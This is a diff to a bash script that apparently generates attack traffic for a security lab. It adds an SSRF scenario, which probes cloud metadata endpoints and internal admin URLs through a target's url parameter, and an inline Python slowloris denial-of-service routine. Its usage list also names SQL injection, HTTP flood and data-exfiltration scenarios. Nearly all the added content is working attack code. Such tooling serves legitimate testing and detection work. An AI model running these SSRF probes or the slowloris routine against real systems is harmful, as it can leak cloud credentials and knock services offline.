@@ -117,6 +117,54 @@ scenario_account_takeover() {
     green "[+] account_takeover complete"
 }
 
+scenario_ssrf() {
+    blue "[*] Scenario: ssrf — Server-Side Request Forgery & metadata probe"
+    PROBES=(
+        "http://169.254.169.254/latest/meta-data/"
+        "http://169.254.169.254/computeMetadata/v1/"
+        "http://127.0.0.1:8080/actuator/env"
+        "http://localhost:3000/rest/admin"
+    )
+    for probe in "${PROBES[@]}"; do
+        curl -s -o /dev/null -w "GET /profile?url=%{url_effective} -> %{http_code}\n" \
+            "${TARGET}/profile?url=${probe}" || true
+    done
+    green "[+] ssrf complete"
+}
+
+scenario_slowloris() {
+    blue "[*] Scenario: slowloris — Low-rate connection exhaustion DoS"
+    python3 -c '
+import socket, time, sys
+target_host = "'"${TARGET#*://}"'"
+target_host = target_host.split(":")[0]
+port = 80
+sockets = []
+for i in range(30):
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.settimeout(4)
+        s.connect((target_host, port))
+        s.send(b"GET / HTTP/1.1\r\nHost: " + target_host.encode() + b"\r\nUser-Agent: Mozilla/5.0 (compatible; Slowloris/1.0)\r\n")
+        sockets.append(s)
+    except Exception:
+        pass
+for _ in range(3):
+    time.sleep(5)
+    for s in list(sockets):
+        try:
+            s.send(b"X-a: b\r\n")
+        except Exception:
+            sockets.remove(s)
+for s in sockets:
+    try:
+        s.close()
+    except Exception:
+        pass
+' 2>&1 || true
+    green "[+] slowloris complete"
+}
+
 scenario_full() {
     blue "[*] Running ALL scenarios in sequence..."
     echo ""
@@ -140,6 +188,12 @@ scenario_full() {
     sleep 5
     scenario_credential_stuffing
     echo ""
+    sleep 5
+    scenario_ssrf
+    echo ""
+    sleep 5
+    scenario_slowloris
+    echo ""
     green "[+] All scenarios complete."
 }
 
@@ -154,6 +208,8 @@ usage() {
     echo "  sqli                 sqlmap SQL injection"
     echo "  http_flood           hey HTTP flood"
     echo "  data_exfiltration    Download large files from /ftp"
+    echo "  ssrf                 Server-Side Request Forgery & metadata probes"
+    echo "  slowloris            Low-rate connection exhaustion DoS"
     echo "  full                 Run all scenarios in sequence"
     exit 1
 }
@@ -170,6 +226,8 @@ case "$1" in
     sqli)                 scenario_sqli ;;
     http_flood)           scenario_http_flood ;;
     data_exfiltration)    scenario_data_exfiltration ;;
+    ssrf)                 scenario_ssrf ;;
+    slowloris)            scenario_slowloris ;;
     full)                 scenario_full ;;
     *)                    red "Unknown scenario: $1"; usage ;;
 esac
